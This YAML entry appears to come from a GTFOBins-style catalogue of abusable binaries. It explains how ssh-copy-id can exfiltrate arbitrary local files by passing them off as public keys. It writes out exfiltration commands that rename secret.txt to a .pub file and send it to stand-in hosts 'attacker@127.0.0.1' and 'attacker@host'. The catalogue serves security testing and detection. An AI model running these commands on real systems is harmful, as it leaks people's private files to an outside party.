---
comment: |-
  ssh-copy-id installs public keys on a remote server for passwordless login. It can be abused to exfiltrate arbitrary local files by tricking it into treating them as public keys.
functions:
  file-read:
  - code: |-
      mv secret.txt secret.txt.pub
      ssh-copy-id -f -i secret.txt.pub attacker@127.0.0.1
    contexts:
      unprivileged:
        comment: |-
          Reads the contents of a local file and sends them to a remote host under the guise of a public key.
  inherit:
  - code: |-
      ssh-copy-id -i secret.txt.pub attacker@host
    comment: |-
      The `-i` flag allows specifying arbitrary files. Combined with `-f`, this can be abused for exfiltration.
    contexts:
      unprivileged:
    from: ssh
...
